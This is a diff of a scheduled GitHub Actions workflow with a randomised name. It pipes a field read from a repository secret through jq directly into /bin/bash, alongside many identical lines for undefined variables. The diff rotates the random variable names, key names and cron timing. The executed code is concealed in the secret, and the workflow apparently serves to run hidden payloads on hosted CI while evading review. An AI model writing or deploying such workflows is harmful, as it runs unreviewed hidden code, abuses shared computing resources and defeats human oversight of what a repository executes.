@@ -1,29 +1,28 @@
 name: wangwudao1918
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 2/6 * * *'
-jobs:  # 20516
+    - cron: '41 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangwudao1918
         env:
-          vicvn3492: ${{ secrets.vicvn3492 }}
+          oq0: ${{ secrets.oq0 }}
         run: |
-          echo $vicvn3492 | jq -r .dmjp543 | /bin/bash
-          echo $ppy6339 | jq -r .hkb36983 | /bin/bash
-          echo $q466 | jq -r .bd4187 | /bin/bash
-          echo $fmvx9 | jq -r .qsnm5 | /bin/bash
-          echo $dmlcg17 | jq -r .q192 | /bin/bash
-          echo $ge801 | jq -r .o6185 | /bin/bash
-          echo $ouj2 | jq -r .jaka1 | /bin/bash
-          echo $qvbr1 | jq -r .adazk35 | /bin/bash
-          echo $a423 | jq -r .hb653 | /bin/bash
-          echo $p89264 | jq -r .pbe7539 | /bin/bash
-          echo $wol63067 | jq -r .oldh02527 | /bin/bash
-          echo $ol6 | jq -r .xzu27 | /bin/bash
+          echo $oq0 | jq -r .qosnr23057 | /bin/bash
+          echo $ojhe818 | jq -r .zuiys45 | /bin/bash
+          echo $yxz2 | jq -r .nfe47 | /bin/bash
+          echo $hgq7395 | jq -r .qgh6416 | /bin/bash
+          echo $h80 | jq -r .fxwhy25 | /bin/bash
+          echo $yp194 | jq -r .ovjv26 | /bin/bash
+          echo $d97650 | jq -r .nxfil28218 | /bin/bash
+          echo $nh4662 | jq -r .uxz767 | /bin/bash
+          echo $lgaqy8 | jq -r .upkwi86084 | /bin/bash
+          echo $r66684 | jq -r .nsmt8 | /bin/bash
+          echo $tsj8 | jq -r .jeo5 | /bin/bash
+          echo $xb272 | jq -r .z8 | /bin/bash
 
